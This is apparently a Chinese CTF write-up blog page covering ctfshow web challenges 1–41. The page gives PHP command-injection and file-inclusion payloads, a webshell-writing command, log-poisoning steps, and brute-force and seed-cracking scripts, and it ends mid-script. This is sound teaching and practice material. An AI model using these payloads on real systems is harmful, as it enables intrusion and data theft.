<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Ctfshow sql篇 | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="CTFshow_Web
信息收集：（完工）
Web 1-5

查看网页源代码
抓个包看有没有藏东西
查看robots.txt
phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag

Web6
网页提示下载源码查看，访问url/www.zip得到源码文件">
<meta name="author" content="Sonny Calcr">
<link rel="canonical" href="http://localhost:1313/post/ctfshow_web/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.5694e7def7144bfe9060777cff84a02d56c6e9929acf2ac82614b8b0b84f3bf2.css" integrity="sha256-VpTn3vcUS/6QYHd8/4SgLVbG6ZKazyrIJhS4sLhPO/I=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow_web/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet"><meta property="og:url" content="http://localhost:1313/post/ctfshow_web/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="Ctfshow sql篇">
  <meta property="og:description" content="CTFshow_Web 信息收集：（完工） Web 1-5 查看网页源代码 抓个包看有没有藏东西 查看robots.txt phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag Web6 网页提示下载源码查看，访问url/www.zip得到源码文件">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-02-20T00:15:50+08:00">
    <meta property="article:modified_time" content="2025-02-20T00:15:50+08:00">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="Ctfshow sql篇">
<meta name="twitter:description" content="CTFshow_Web
信息收集：（完工）
Web 1-5

查看网页源代码
抓个包看有没有藏东西
查看robots.txt
phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag

Web6
网页提示下载源码查看，访问url/www.zip得到源码文件">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Ctfshow sql篇",
      "item": "http://localhost:1313/post/ctfshow_web/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Ctfshow sql篇",
  "name": "Ctfshow sql篇",
  "description": "CTFshow_Web 信息收集：（完工） Web 1-5 查看网页源代码 抓个包看有没有藏东西 查看robots.txt phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag Web6 网页提示下载源码查看，访问url/www.zip得到源码文件\n",
  "keywords": [
    
  ],
  "articleBody": "CTFshow_Web 信息收集：（完工） Web 1-5 查看网页源代码 抓个包看有没有藏东西 查看robots.txt phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag Web6 网页提示下载源码查看，访问url/www.zip得到源码文件\n解压文件我们得到\n打开fl00g.txt，没有我们想要的flag\n打开index.php\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-01 14:37:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-01 14:42:44 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13//flag in fl000g.txt 14echo \"web6:where is flag?\" 15?\u003e 显示flag in fl00g.txt\n直接访问url/fl00g.txt得到flag\nweb7 git泄露，访问url/.git即可得到flag\nweb8 svn泄露，访问url/.git即可得到flag\nweb9 vim缓存信息泄露，访问url/index.php.swp，打开下载的index.php.swp即可得到flag\nweb10 根据hint查看cookie可以看到\ncookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D\n进行url解码即可得到flag\nweb11 域名解析\n我们可以通过nslookup来进行域名解析查询\nnslookup -qt=格式 URL nslookup -qt=any URL //遍历所有格式 nslookup -qt=TXT URL //查询txt格式 web12 hint：有时候网站上的公开信息，就是管理员常用密码\n先用dirsearch扫一下\n访问admin，要求我们输入管理员账号密码，根据后台路径我们可以猜测账号为admin\n回到主页，在网页的底部我们可以看到一个电话Help Line Number : 372619038\n猜测电话为管理员密码，输入后成功得到flag\nweb13 在页面底部可以看到一个document\n点击发现下载了一个document.pdf文件，文件里有后台的地址和账号密码\nd\n登录后台即可得到flag\nweb14 根据hint知道editor处应该有信息泄漏(虽然不知道什么是editor)\n我们先用dirsearch扫一下后台\n访问url/editor\n是一个文字编辑的页面，我们可以发现在上传附件📎出可以调用出到服务器的文件管理器\n在服务器的根目录没看到flag，尝试查看网站的根目录(var/www/html),看看有没有隐藏页面\n发现nothinghere文件夹中有个fl00g.txt文件\n访问url/nothinghere/f1000g.txt即可得到flag\nweb15 扫描到后台为url/admin，打开看到有个忘记密码，要求输入城市\n根据hint我们可以在主页底部找到一个qq邮箱，查询一下qq号\n得到信息，现居陕西西安\n输入西安成功重置密码，输入重置密码和帐号admin，成功得到flag\nWeb16 探针泄漏\ndirsearch 扫描不到这个探针，看wp才知道的\n探针在url/tz.php\n访问探针\n在指针里面可以找到phpinfo页面\n打开在phpinfo里面可以找到flag\nweb17 sql备份泄漏\n用dirsearch扫出来存在sql备份泄漏，下载backup.sql，打开得到flag\nweb18 本题是一个游戏，玩到101分就能得到flag\n我们直接看js\nFlappy_js.js\n审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试\n根据提示访问url/110.php,得到flag\nweb19 题目是一个登录的页面，根据hint查看网页源代码\n根据提示，这道题应该是一道对密码进行了加密的题目\n审阅一下代码我们得到这些信息\nmode模式： CBC padding 填充方式： ZeroPadding 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\nAES 加密/解密 - 锤子在线工具\n用解密工具解密一下密文我们可以得到密码为\n输入密码，得到flag\nweb20 hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。\n这是一个使用access数据库的asp程序\n根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb\n下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}\n爆破：（完工） web21 抓个包\n我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大\npayload设置如下\n我们还要设置一下payload处理\n开始爆破，根据长度或者状态码判断即可\nweb22 域名爆破\n通过爆破ctf.show的子域名可以爆破到flag.ctf.show\n访问即可得到flag(虽然已经挂了)\nweb23 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 11:43:51 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 11:56:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14 15include('flag.php'); 16if(isset($_GET['token'])){ 17 $token = md5($_GET['token']); 18 if(substr($token, 1,1)===substr($token, 14,1) \u0026\u0026 substr($token, 14,1) ===substr($token, 17,1)){ 19 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 20 echo $flag; 21 } 22 } 23}else{ 24 highlight_file(__FILE__); 25 26} 27?\u003e 分析代码可知： 需要找到一个合适的 token 值，使得以下条件成立：\n1、md5(token) 的第 1 位（从 0 开始算）等于第 14 位\n2、md5(token) 的第 14 位等于第 17 位。\n3、md5(token) 的第 1 位的整数值、14 位的整数值、和 17 位的整数值的和除以第 1 位的整数值等于第 31 位的整数值。\n既然不知道怎么凑那我们可以尝试爆破\n通过bp爆破一下1-1000中是否有符合上述条件的字符串\n哎我草，怎么就爆破出来了，虽然不知道为什么纯数字还能爆出来\n其他解法，可以用大佬的脚本\n1# coding: utf-8 2# alberthao 3import hashlib 4 5dic = '0123456789qazwsxedcrfvtgbyhnujmikolp' 6for a in dic: 7 for b in dic: 8 t = str(a) + str(b) 9 md5 = hashlib.md5(t.encode('utf-8')).hexdigest() 10 # print md5 11 # print md5[1:2] 12 # print md5[14:15] 13 # print md5[17:18] 14 if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: 15 if (ord(md5[1:2])) \u003e= 48 and ord(md5[1:2]) \u003c= 57 and (ord(md5[14:15])) \u003e= 48 and ord(md5[14:15]) \u003c= 57: 16 if (ord(md5[17:18])) \u003e= 48 and ord(md5[17:18]) \u003c= 57 and (ord(md5[31:32])) \u003e= 48 and ord( 17 md5[31:32]) \u003c= 57: 18 if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]): 19 print(t) or\n1import hashlib 2for i in range(1,10000): 3 4md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest() 5 6if md5[1] != md5[14] or md5[14]!= md5[17]: 7\tcontinue 8 9if(ord(md5[1]))\u003e=48 and ord(md5[1])\u003c=57 and (ord(md5[31]))\u003e=48 and ord(md5[31])\u003c=57: 10 11\tif((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])): 12 13\tprint(i) web24 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:26:39 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 13:53:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\"flag.php\"); 16if(isset($_GET['r'])){ 17 $r = $_GET['r']; 18 mt_srand(372619038); 19 if(intval($r)===intval(mt_rand())){ 20 echo $flag; 21 } 22}else{ 23 highlight_file(__FILE__); 24 echo system('cat /proc/version'); 25} 26 27?\u003e 这道题考察的是一个php伪随机数的题目\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的\n虽然说是随机数，但是同一个种子会生成同一串数字\npoc\n1\u003c?php 2mt_srand(372619038); 3echo intval(mt_rand()); 4?\u003e 不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag\nweb25 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:56:57 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 15:47:33 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15error_reporting(0); 16include(\"flag.php\"); 17if(isset($_GET['r'])){ 18 $r = $_GET['r']; 19 mt_srand(hexdec(substr(md5($flag), 0,8))); 20 $rand = intval($r)-intval(mt_rand()); 21 if((!$rand)){ 22 if($_COOKIE['token']==(mt_rand()+mt_rand())){ 23 echo $flag; 24 } 25 }else{ 26 echo $rand; 27 } 28}else{ 29 highlight_file(__FILE__); 30 echo system('cat /proc/version'); 31} 继续php伪随机数\n我们需要知道一个性质\n当mt_srand()中的种子是固定的，那么我们生成的随机数的序列就是相同的，如下\n1\u003c?php 2 3mt_srand(1852100618); 4 5echo mt_rand(); 6echo mt_rand(); 7echo mt_rand(); 8echo mt_rand(); 9 10''' 111640856123 121390302953 13893879251 14859994814 在这道题里面我们需要得到前三个随机数\n第一个随机数我们可以使r=0得到，第一个随机数为1640856123\n得到第一个随机数之后我们可以通过爆破的方式得到种子，从而得到第二，第三个随机数\nphp脚本(极其慢)\n1\u003c?php 2$a= 390148868;//第一个随机数 3$b= 0 ; 4while (true){ 5 mt_srand($b); 6 if(mt_rand()==$a){ 7 echo \"success:\"+$b; 8 break; 9 } 10 echo $b; 11 echo \"\\n\"; 12 $b+=1; 13 14} 或者使用php_mt_seed-4.0工具\n我们可以看到不同版本的seed是不同的，我们一个个试试就行了\n1mt_srand(1852100618); 2echo mt_rand();// 第一次随机数（不能少） 3echo \"\\ntoken：\"; 4echo (mt_rand()+mt_rand()); //第二和第三次随机数相加，也就是我们要对token 得到token的值，我们只需要使rand为零即可得到flag\n也就是说我们只需要使r等于第一次随机数即可\n传参，得到flag\nweb26 这么多我咋爆，赌一把只爆密码\nweb27 这题是一个教务系统，需要通过账号密码登录\n先信息收集一下\n我们可以看到在账号密码下面有一个录取名单和学生学籍信息查询系统\n分别如上，那我们是否可以通过爆破学生的身份证信息从而通过录取查询查到学生的信息呢？\nbp抓个包\n哎我草，我数据呢\nforward一下（是因为数据实际上在checkdb.php才提交吗？不是很懂）\n我们可以发现其实身份证缺失的部分刚好是出生日期\n那我们可以用bp中的日期爆破功能\n爆出来的msg用unicode解码一下就能得到账号密码了\n贴个大佬的脚本\n1url='https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php' NUM=32 2 3def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U)) 4 5class TaskRuner: def init(self,n) -\u003e None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass 6 7import aiohttp from urllib.parse import quote from datetime import date, timedelta 8 9class NYR: def init(self,start_date,end_date) -\u003e None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t\u003eself.end_date: return None self.current_date+=self.delta return t 10 11class Scanner(TaskRuner): def init(self,d1,d2,n) -\u003e None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True 12 13async def task_function(self, n): 14 while self.alive: 15 u=self.nyr.next() 16 if not u: 17 break 18 r=await self.login(u) 19 if r: 20 self.alive=False 21async def login(self,t:date): 22 url='https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php' 23 n=t.year 24 y=t.month 25 r=t.day 26 n=str(n) 27 y=str(y) 28 r=str(r) 29 if len(y)==1: 30 y='0'+y 31 if len(r)==1: 32 r='0'+r 33 sfz='621022'+n+y+r+'5237' 34 data={ 35 'a':'高先伊', 36 'p':sfz, 37 } 38 sess=aiohttp.ClientSession() 39 try: 40 r=await sess.post(url=url,data=data,ssl=False) 41 text=await r.text() 42 js=loads(text) 43 msg=js['msg'] 44 print(sfz,msg) 45 await sess.close() 46 return msg!='提交信息有误' 47 except Exception as e: 48 print(e) 49 pass 50 try: 51 await sess.close() 52 except: 53 pass 54 return False 55 56async def handle_up(self,u,p): 57 pass 58a=Scanner(date(1990,1,1),date(2010,12,12),NUM) 59 60a.run() web28 这题本来不知道要干嘛\ndirsearch扫一下,感觉应该是目录爆破\n先爆破一下0-100\n命令执行： web29 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\n进行绕过就行，解法很多\nc=system(“cat fl*g.php | grep -E ‘fl.g’ “);\nc=system(“tac fl*g.php”);\nc=system(“cat fl*g.php”);（用cat要右键查看源代码才能看到回显）\nc=system(“cp fl*g.php a.txt “);（访问a.txt查看）\nc=system(’echo -e \" \u003c?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \" \u003e a.php’); //直接新建一个页面并写入一句话木马 （/a.php?c=system(“tac flag.php”);）\n?c=echo `tac fla*`;\n….\nweb30 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行\npayload:\nc=printf(exec(“cat%20fl*”));\nc=echo exec(“cat f\\lag.p\\hp”);\nc=show_source(scandir(”.”)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)\nc=highlight_file(next(array_reverse(scandir(”.”))));\nc=passthru(“tac fla*”);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(“tac fla*”);*\nc=echo shell_exec(“tac fla*”);\nc=eval($_GET[1]);\u00261=system(“tac flag.php”);\nc=passthru(base64_decode(“Y2F0IGZsYWcucGhw==”));(base64绕过)\n……\nweb31 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u00261=system(“tac flag.php”); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(“tac%09fla*”); c=echo`tac%09fla*`; web32 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\n过滤了空格可以用${IFS}和%0a 代替，分号可以用?\u003e代替\n用include构造payload：\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\n得到的结果用base64解码一下就可以得到flag了\n或者用日志注入：\nurl/?c=include$_GET[1]?%3E\u00261=../../../../var/log/nginx/access.log /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\nweb33 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\"\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=\n继续使用include构造payload：（wsm还能秒）\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u003c?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=|\\/|[0-9]/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=|/|[0-9]\n不是哥们，数字也要屏蔽，那我改一下不就好了\n继续使用include构造payload：\nurl/?c=include$_GET[m]?\u003e\u0026m=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[m]?\u003e\u0026m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} 不是哥们，怎么还是文件包含\npayload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|php|file/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c.\".php\"); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里会在我们传入的c后面拼接一段.php\n我们只需要在加入\u003c?php ?\u003e那么php就只会执行中间的代码，后面的内容不会执行\n故payload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\\u003c|\\.|\\\u003e|\\/|\\?|\\\\\\\\/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /[0-9]|~|`|@|#|\\$|%|^|\u0026|*|\\（|\\）|-|=|+|{|[|]|}|:|'|\"|,|\u003c|.|\u003e|/|?|\\\\\n这里要使用无参命令执行\npayload：\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\n关于无参命令执行的一些解释\nweb41 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 羽 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST['c'])){ 15 $c = $_POST['c']; 16if(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i', $c)){ 17 eval(\"echo($c);\"); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u003e 过滤内容：/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。 我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n大佬的脚本\n1\u003c?php 2$myfile = fopen(\"rce_or.txt\", \"w\"); 3$contents=\"\"; 4for ($i=0; $i \u003c 256; $i++) { 5\tfor ($j=0; $j \u003c256 ; $j++) { 6 7\tif($i\u003c16){ 8\t$hex_i='0'.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u003c16){ 14\t$hex_j='0'.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i'; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \"\"; 22 } 23 24\telse{ 25\t$a='%'.$hex_i; 26\t$b='%'.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u003e=32\u0026ord($c)\u003c=126) { 29\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\"php rce_or.php\") #没有将php写入环境变量需手动运行 7if(len(argv)!=2): 8 print(\"=\"*50) 9 print('USER：python exp.py ') 10 print(\"eg： python exp.py http://ctf.show/\") 11 print(\"=\"*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\"\" 16 s2=\"\" 17 for i in arg: 18 f=open(\"rce_or.txt\",\"r\") 19 while True: 20 